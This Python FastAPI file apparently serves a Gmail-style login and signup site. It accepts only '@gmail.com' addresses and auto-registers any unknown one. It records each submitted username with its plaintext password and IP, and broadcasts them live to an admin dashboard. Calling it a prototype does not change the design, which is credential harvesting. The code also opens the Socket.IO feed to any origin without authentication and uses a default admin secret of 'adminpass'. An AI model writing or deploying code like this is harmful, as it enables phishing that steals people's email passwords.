# main.py
import uvicorn
from fastapi import FastAPI, Request, Form, Response, Depends, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import socketio
import datetime
import os

# ---------- In-memory prototype stores (NOT for production) ----------
users = {}  # username -> password (plaintext here for prototype only)
login_events = []  # list of dicts {username, password, ip, ts}

# Admin secret for accessing admin pages (set to something secure locally)
ADMIN_SECRET = os.environ.get("ADMIN_SECRET", "adminpass")  # change for local use

# ---------- Socket.IO server (async) ----------
sio = socketio.AsyncServer(async_mode='asgi', cors_allowed_origins='*')
app = FastAPI()
sio_app = socketio.ASGIApp(sio, other_asgi_app=app)

# Static and templates
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

# ---------- Helpers ----------
def record_login(request: Request, username: str, password: str):
    ip = request.client.host if request.client else "unknown"
    ts = datetime.datetime.utcnow().isoformat() + "Z"
    event = {"username": username, "password": password, "ip": ip, "ts": ts}
    login_events.append(event)
    # Emit to connected admin dashboards
    try:
        # broadcast to namespace default
        import asyncio
        asyncio.create_task(sio.emit("login_event", event))
    except Exception:
        pass
    return event

def check_admin_token(request: Request):
    token = request.cookies.get("admin_token")
    if token != ADMIN_SECRET:
        raise HTTPException(status_code=401, detail="Admin auth required")
    return True

# ---------- Routes: Public ----------
@app.get("/", response_class=HTMLResponse)
def home(request: Request):
    return RedirectResponse(url="/login")

@app.get("/signup", response_class=HTMLResponse)
def signup_get(request: Request):
    return templates.TemplateResponse("signup.html", {"request": request})

@app.post("/signup")
async def signup_post(request: Request, username: str = Form(...), password: str = Form(...)):
    # Ensure username ends with @gmail.com
    if not username.endswith("@gmail.com"):
        return templates.TemplateResponse(
            "signup.html",
            {"request": request, "error": "Email must end with @gmail.com"}
        )

    # Check if username already exists
    if username in users:
        return templates.TemplateResponse(
            "signup.html",
            {"request": request, "error": "This Gmail address is already registered."}
        )

    # Save new user (prototype — plaintext storage, not for production)
    users[username] = password
    return templates.TemplateResponse(
        "signup.html",
        {"request": request, "success": "Account created successfully. Please log in."}
    )


@app.get("/login", response_class=HTMLResponse)
def login_get(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@app.post("/login")
async def login_post(request: Request, username: str = Form(...), password: str = Form(...)):
    # Ensure @gmail.com is present
    if not username.endswith("@gmail.com"):
        return templates.TemplateResponse(
            "login.html",
            {"request": request, "error": "Email must end with @gmail.com"}
        )

    # Check user in DB
    pw = users.get(username)
    if pw is None:
        # Auto-register if user doesn’t exist (optional)
        users[username] = password
        record_login(request, username, password)
        resp = RedirectResponse(url="/", status_code=302)
        resp.set_cookie("user", username, httponly=True)
        return resp

    # Validate password
    if pw != password:
        return templates.TemplateResponse(
            "login.html",
            {"request": request, "error": "Invalid password."}
        )

    # Record successful login
    record_login(request, username, password)
    resp = RedirectResponse(url="/", status_code=302)
    resp.set_cookie("user", username, httponly=True)
    return resp

# ---------- Admin routes ----------
@app.get("/admin/login", response_class=HTMLResponse)
def admin_login_get(request: Request):
    return templates.TemplateResponse("admin_login.html", {"request": request})

@app.post("/admin/login")
def admin_login_post(request: Request, password: str = Form(...)):
    if password != ADMIN_SECRET:
        return templates.TemplateResponse("admin_login.html", {"request": request, "error": "Wrong admin password."})
    
    resp = RedirectResponse(url="/admin/dashboard", status_code=302)
    resp.set_cookie("admin_token", ADMIN_SECRET, httponly=True)
    return resp

# --- NEW: API Route for Users Tab ---
# This route is required for the "Users" tab to auto-refresh
@app.get("/api/get_users", dependencies=[Depends(check_admin_token)])
def api_get_users():
    # In a real app, you'd fetch this from the database
    return users 

# --- REMOVED ROUTES ---
# These routes are no longer needed because they are now tabs
# in the main dashboard.
#
# @app.get("/admin/users", ...)
# @app.get("/admin/logs", ...)

# --- MODIFIED: Main Dashboard Route ---
# This single route now renders the combined dashboard.
@app.get("/admin/dashboard", response_class=HTMLResponse, dependencies=[Depends(check_admin_token)])
def admin_dashboard(request: Request):
    # This page now needs to be pre-populated with data
    # for all tabs (Users and Logs).
    return templates.TemplateResponse("admin_dashboard.html", {
        "request": request,
        "users": users,                 # Pass user data for the "Users" tab
        "events": reversed(login_events) # Pass log data for the "Logs" tab
    })

# ---------- Socket.IO events (optional admin-driven) ----------
@sio.event
async def connect(sid, environ):
    # Optionally you could verify admin cookies here
    print("Socket connected:", sid)

@sio.event
async def disconnect(sid):
    print("Socket disconnected:", sid)

# ---------- Run via: uvicorn main:sio_app --reload --port 8000 ----------
if __name__ == "__main__":
    uvicorn.run("main:sio_app", host="127.0.0.1", port=8000, reload=True)